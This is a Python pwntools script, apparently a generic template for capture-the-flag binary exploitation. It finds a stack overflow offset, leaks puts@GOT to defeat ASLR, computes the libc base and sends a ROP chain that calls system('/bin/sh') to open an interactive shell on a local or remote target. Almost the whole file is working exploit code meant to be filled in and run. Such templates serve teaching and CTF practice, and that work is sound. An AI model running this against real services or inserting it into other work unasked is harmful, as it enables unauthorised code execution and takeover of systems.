#!/usr/bin/env python3
"""
Template: ret2libc via GOT leak (works for 32-bit and 64-bit, ASLR enabled, no PIE)
Usage: edit BINARY, REMOTE_HOST, REMOTE_PORT then run.
"""
from pwn import *

# ── config ─────────────────────────────────────────────────────────────────
BINARY      = "./vuln"          # path to binary
LIBC_PATH   = None              # set to "./libc.so.6" if you have it; None = auto-detect
REMOTE_HOST = "localhost"
REMOTE_PORT = 1337
OFFSET      = None              # fill in after cyclic analysis (see STEP 1)

context.binary = elf = ELF(BINARY)
libc = ELF(LIBC_PATH) if LIBC_PATH else elf.libc
context.log_level = "info"

# ── helpers ─────────────────────────────────────────────────────────────────
def conn():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(BINARY)

# ── STEP 1: find offset ──────────────────────────────────────────────────────
# Run locally:
#   python3 -c "from pwn import *; print(cyclic(200))" | ./vuln
#   dmesg | tail  (read fault address)
#   python3 -c "from pwn import *; print(cyclic_find(0x<addr>))"
# Set OFFSET above once known.

# ── STEP 2: leak libc base via puts(puts@GOT) ───────────────────────────────
def leak_and_pwn():
    assert OFFSET is not None, "Set OFFSET first (see STEP 1)"

    p = conn()

    # 64-bit ROP: pop rdi; ret gadget needed
    if elf.arch == "amd64":
        rop = ROP(elf)
        pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
        ret_gadget = rop.find_gadget(["ret"])[0]

        payload  = b"A" * OFFSET
        payload += p64(pop_rdi)
        payload += p64(elf.got["puts"])
        payload += p64(elf.plt["puts"])
        payload += p64(elf.sym["main"])     # loop back to main for stage 2
    else:
        # 32-bit: args on stack
        payload  = b"A" * OFFSET
        payload += p32(elf.plt["puts"])
        payload += p32(elf.sym["main"])
        payload += p32(elf.got["puts"])

    p.sendlineafter(b":", payload)         # adjust trigger string

    # receive leaked address
    p.recvline()                            # junk before leak if any
    leak = u64(p.recvline()[:6].ljust(8, b"\x00")) if elf.arch == "amd64" \
           else u32(p.recv(4))
    log.success(f"puts @ {hex(leak)}")

    libc.address = leak - libc.sym["puts"]
    log.success(f"libc base @ {hex(libc.address)}")

    # Stage 2: call system("/bin/sh")
    bin_sh = next(libc.search(b"/bin/sh"))
    if elf.arch == "amd64":
        payload2  = b"A" * OFFSET
        payload2 += p64(ret_gadget)         # stack alignment for Ubuntu 18+
        payload2 += p64(pop_rdi)
        payload2 += p64(bin_sh)
        payload2 += p64(libc.sym["system"])
        payload2 += p64(libc.sym["exit"])
    else:
        payload2  = b"A" * OFFSET
        payload2 += p32(libc.sym["system"])
        payload2 += p32(libc.sym["exit"])
        payload2 += p32(bin_sh)

    p.sendlineafter(b":", payload2)
    p.interactive()

leak_and_pwn()
